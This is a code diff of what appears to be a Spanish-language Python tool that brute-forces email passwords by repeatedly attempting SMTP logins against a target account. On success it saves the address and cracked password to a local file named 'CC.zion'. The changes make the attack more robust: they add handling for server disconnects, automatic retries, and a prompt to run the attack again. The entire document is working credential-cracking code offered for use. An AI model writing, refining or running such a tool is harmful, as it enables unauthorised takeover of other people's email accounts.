@@ -214,25 +214,33 @@ def Conexion():
 			smtpserver.login(Usuario, Pwd)
 			print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
 			global xD
+			global xD2
 			xD = True
+			xD2 = False
 			
 			passwd=open('CC.zion','a')
 			
 			FechaF = time.strftime("\n\n\t [*] Fecha: %d/%m/%Y %H:%M:%S")
-			xD="\n\t"+FechaF+\
-			   "\n\t ____________________________________________________ "+\
-			   "\n\n\t [+] Correo: "+str(Usuario)+"\n\n\t [+] Contraseña: "+str(Pwd)+\
-			   "\n\t ==================================================== "
-			passwd.write(xD)
+			Datos="\n\t"+FechaF+\
+			      "\n\t ____________________________________________________ "+\
+			      "\n\n\t [+] Correo: "+str(Usuario)+"\n\n\t [+] Contraseña: "+str(Pwd)+\
+			      "\n\t ==================================================== "
+			passwd.write(Datos)
 			passwd.close()
 			print(time.strftime("\n\n\n\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
 			print("\n\t [!] La Contraseña ha sido exitosamente encontrada.")
 			print("\n\t [+] Fue Guardada En El Archivo CC.zion.\n\n\t "+Autor)
 			os.system('Timeout /nobreak 03 > Nul')
-			main()
+			exit(0)
 		except smtplib.SMTPAuthenticationError:
 			print ("\t [*] " + str(Pwd))
-	
+		except smtplib.SMTPServerDisconnected:
+			print("\n\t El Servidor Ha Cerrado La Conexión...  Reintentando...")
+			os.system('Timeout /nobreak 03 > Nul')
+			main()
+		except Exception as ex:
+			print( type(ex).__name__ ) #Para ver cuando ocurre un error y poder añadirlo a las ecepciones, y no cierre el programa.
+
 
 def main():
 	
@@ -314,11 +322,22 @@ def main():
 		Correo()
 		TiempoI = time.strftime("\n\n\n\t [!] Iniciado:   %d/%m/%Y %H:%M:%S")
 		Conexion()
+		TiempoF = time.strftime("\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S")
 		print(TiempoI)
-		print(time.strftime("\n\t [!] Finalizado: %d/%m/%Y %H:%M:%S"))
+		print(TiempoF)
 		
 		if xD == False:
-			print ("\n\n\n\t\t [*] Vuelve a intentarlo...\n\n")
+			
+			resp=input("\n\n\t Deseas volver a intentarlo? [S/N]: ")
+			
+			if resp == "S" or resp == "s" or resp == "SI" or resp == "Si" or resp == "si":
+				print ("\n\n\n\t\t [*] Volviendo a intentarlo...\n\n")
+				os.system('Timeout /nobreak 03 > Nul')
+				main()
+			else:
+				print("\n\n\n\t\t Saliendo...")
+				os.system('Timeout /nobreak 03 > Nul')
+				exit(0)
 		
 		os.system('Timeout /nobreak 03 > Nul')
 
